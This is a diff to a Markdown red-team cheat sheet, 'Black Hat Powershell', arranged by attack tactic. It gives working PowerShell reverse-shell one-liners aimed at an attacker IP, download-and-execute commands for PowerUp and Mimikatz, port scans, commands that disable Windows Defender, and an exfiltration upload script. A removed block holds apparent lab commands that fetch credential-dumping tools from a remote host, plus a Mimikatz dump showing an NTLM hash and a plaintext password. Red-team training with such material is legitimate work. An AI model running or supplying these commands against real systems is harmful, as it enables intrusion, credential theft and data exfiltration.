@@ -1,4 +1,20 @@
-
+---
+title: "Black Hat Powershell"
+author: ["FBAKRI"]
+date: "2022-11-08"
+subject: "Markdown"
+keywords: [Markdown, Example]
+subtitle: "First Draft"
+lang: "en"
+titlepage: true
+titlepage-color: "B30000"
+titlepage-text-color: "FFFAFA"
+titlepage-rule-color: "FFFAFA"
+titlepage-rule-height: 2
+book: true
+classoption: oneside
+code-block-font-size: \scriptsize
+---
 
 # Introduction
 
@@ -26,6 +42,7 @@ $securePassword = ConvertTo-SecureString $password -AsPlainText -Force
 $credential = New-Object System.Management.Automation.PSCredential $username, $securePassword
 Start-Process powershell.exe -Credential $credential
 ```
+
 You can also execute any executable like reverseshell as the new user by replacing `powershell.exe` with another executable.
 
 ### Running Powershell on Another System Remotely
@@ -74,7 +91,10 @@ Invoke-Command -ScriptBlock {whoami;hostname} -ComputerName Server01 -Credential
 
 
 ### 9 Ways to Open Powershell
+
 https://www.howtogeek.com/662611/9-ways-to-open-powershell-in-windows-10
+
+
 
 
 # Reconnaissance
@@ -180,6 +200,7 @@ until ($input -eq 'q')
 ```
 
 ## Network Discovery
+
 ### Ping Sweep Oneliner
 
 Paste the following code in a Powershell console. It will ask for input.
@@ -198,13 +219,17 @@ End IP (for example: 254): 10
 ```
 
 ### Port Scanning
+
 #### Single Host Multiple Ports
+
 `1..1024 | % {echo ((new-object Net.Sockets.TcpClient).Connect("10.0.0.100",$_)) "Port $_ is open!"} 2>$null`
 
 #### Single Port Multiple Hosts
+
 `foreach ($ip in 1..20) {Test-NetConnection -Port 80 -InformationLevel "Detailed" 192.168.1.$ip}`
 
 #### Multiple Hosts Multiple Ports
+
 `1..20 | % { $a = $_; 1..1024 | % {echo ((new-object Net.Sockets.TcpClient).Connect("10.0.0.$a",$_)) "Port $_ is open!"} 2>$null}`
 
 ### Simple Port Scanning Script
@@ -235,9 +260,15 @@ Link https://raw.githubusercontent.com/BornToBeRoot/PowerShell_IPv4PortScanner/m
 https://github.com/BornToBeRoot/PowerShell_IPv4PortScanner
 
 *Note - Yes, Nmap is better. However, you may find yourself in a situation where you cannot install nmap or anything else.*
+
+# Initial Access
+
+TODO. 
+
 # Execution
 
 ## Reverse Shells
+
 ### Reverse Shell - One-Liners
 
 Modify the IP address and the port to the attacker's.
@@ -251,6 +282,7 @@ or
 ```powershell
 $sm=(New-Object Net.Sockets.TCPClient('192.168.254.1',55555)).GetStream();[byte[]]$bt=0..65535|%{0};while(($i=$sm.Read($bt,0,$bt.Length)) -ne 0){;$d=(New-Object Text.ASCIIEncoding).GetString($bt,0,$i);$st=([text.encoding]::ASCII).GetBytes((iex $d 2>&1));$sm.Write($st,0,$st.Length)}
 ```
+
 ### Reverse Shell - Powercat
 
 Link https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1
@@ -290,11 +322,14 @@ On Kali
 
 On Target
 
-`powershell.exe -ExecutionPolicy Bypass -NoExit -File shell.ps1`# Delivery
+`powershell.exe -ExecutionPolicy Bypass -NoExit -File shell.ps1`
+
+# Delivery
 
 Yes. I know. Delivery is not on Mitre Att&ck Framework. However, downloading and uploading files is an absolute necessity during a Red Team engagement.
 
 ## Download Files
+
 ### Download and Run in Memory
 
 ```
@@ -348,91 +383,9 @@ $WebClient.DownloadFile("http://172.16.99.87/PowerView.ps1","C:\Users\student487
 
 ```
 
-```
-iex (iwr http://172.16.99.87/Invoke-Mimikatz.ps1 -UseBasicParsing)
+# Persistence
 
-iwr http://172.16.99.87/SafetyKatz.exe -OutFile "C:\Program Files (x86)\Jenkins\workspace\Project11\SafetyKatz.exe"
-
-iwr http://172.16.99.87/mimikatz.exe -OutFile "C:\Program Files (x86)\Jenkins\workspace\Project11\mimikatz.exe"
-
-
-iwr http://172.16.99.87/Loader.exe -OutFile "C:\Program Files (x86)\Jenkins\workspace\Project11\Loader.exe"
-
-
-
-
-$sess = New-PSSession -ComputerName dcorp-mgmt.dollarcorp.moneycorp.local
-
-$sess2 = New-PSSession -ComputerName dcorp-adminsrv.dollarcorp.moneycorp.local
-
-Invoke-command -ScriptBlock{Set-MpPreference -DisableIOAVProtection $true} -Session $sess
-
-Invoke-command -ScriptBlock ${function:Invoke-Mimikatz} -Session $sess
-
-Invoke-command -ScriptBlock{Get-Process -IncludeUserName} -Session $sess
-
-
-Invoke-command -ScriptBlock{$ExecutionContext.SessionState.LanguageMode = "FullLanguage"} -Session $sess2
-
-
-Invoke-command -ScriptBlock{whoami} -Session $sess
-```
-
-```
-Authentication Id : 0 ; 64685 (00000000:0000fcad)
-Session           : Service from 0
-User Name         : svcadmin
-Domain            : dcorp
-Logon Server      : DCORP-DC
-Logon Time        : 11/16/2021 8:50:08 PM
-SID               : S-1-5-21-1874506631-3219952063-538504511-1122
-	msv :	
-	 [00000003] Primary
-	 * Username : svcadmin
-	 * Domain   : dcorp
-	 * NTLM     : b38ff50264b74508085d82c69794a4d8
-	 * SHA1     : a4ad2cd4082079861214297e1cae954c906501b9
-	 * DPAPI    : fd3c6842994af6bd69814effeedc55d3
-	tspkg :	
-	wdigest :	
-	 * Username : svcadmin
-	 * Domain   : dcorp
-	 * Password : (null)
-	kerberos :	
-	 * Username : svcadmin
-	 * Domain   : DOLLARCORP.MONEYCORP.LOCAL
-	 * Password : *ThisisBlasphemyThisisMadness!!
-	ssp :	
-	credman :	
-
-
-$null | winrs -r:dcorp-mgmt C:\Users\Public\Loader.exe -path http://172.16.99.87/SafetyKatz.exe sekurlsa::ekeys exit
-```
-
-
-```
-Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections
-```
-
-
-```
-$null | winrs -r:dcorp-mgmt "netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=80 connectaddress=172.16.99.87"
-
-
-
-iwr http://172.16.99.87/Loader.exe -OutFile C:\Users\Public\Loader.exe
-
-
-iwr http://172.16.99.87/Rubeus.exe -OutFile C:\Users\Public\Rubeus.exe
-
-
-echo Y | xcopy C:\Users\Public\Loader.exe \\dcorp-mgmt\C$\Users\Public\Loader.exe
-
-
-$null | winrs -r:dcorp-mgmt C:\Users\Public\Loader.exe -path http://127.0.0.1:8080/SafetyKatz.exe sekurlsa::ekeys exit
-
-```
-
+TODO. Maybe Scheduled tasks.
 
 # Privilege Escalation
 
@@ -451,6 +404,8 @@ Download and run from internet
 ```
 powershell iex (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/PowerUp.ps1');Invoke-AllChecks
 ```
+
+
 # Defense Evasion
 
 ## Bypassing Execution Policy
@@ -461,7 +416,9 @@ powershell iex (New-Object Net.WebClient).DownloadString('https://raw.githubuser
 
 
 ## Windows Defender
+
 ### Disable Windows Defender
+
 In PowerShell, the following 2 commands with *Admin privilege*:
  
 	Set-MpPreference -DisableRealtimeMonitoring $true -force
@@ -475,6 +432,7 @@ Check that path from which Windows Defender allows execusion.
 `Get-MpPreference | Select-Object -ExpandProperty ExclusionPath` 
 
 ## Windows Firewall
+
 ### Creating rules
 TODO
 
@@ -634,12 +592,11 @@ Max(K) Retain OverflowAction        Entries Log
 30,016      0 OverwriteAsNeeded           1 Security
 15,168      0 OverwriteAsNeeded           2 System
 15,360      0 OverwriteAsNeeded           0 Windows PowerShell
-
 ```
+
 
 # Credential Access
 ## Mimikatz
-
 
 ```
 # Invoke-Mimikatz: Dump credentials from memory
@@ -659,9 +616,16 @@ powershell.exe -exec Bypass -C "IEX (New-Object Net.WebClient).DownloadString('h
 
 Dump hashes if you have admin privilege
 
-https://github.com/samratashok/nishang/blob/master/Gather/Get-PassHashes.ps1Check this
+https://github.com/samratashok/nishang/blob/master/Gather/Get-PassHashes.ps1
 
-https://cheats.philkeeble.com/active-directory/lateral-movement# Collection
+# Lateral Movement
+
+Check this
+
+https://cheats.philkeeble.com/active-directory/lateral-movement
+
+
+# Collection
 
 ## Snapshots
 
@@ -770,10 +734,11 @@ You may want to clean up after yourself.
 `Remove-Item C:\Test\*.*`
 `Remove-Item C:\Users\Public\*.*`
 
-# Command and Control
 
+# Command and Control
 ## Covenant
 ## Empire
+
 
 # Exfiltration
 
@@ -843,6 +808,7 @@ $WebClient.UploadFile($url, (Get-Location).Path + "\" + $filename)
 `./upload.ps1 <https://ip:port/> <admin:password> <file (in current dir)>`
 
 `./upload.ps1 https://192.168.46.1:4433/ admin:password file_to_upload`
+
 
 # Impact
 
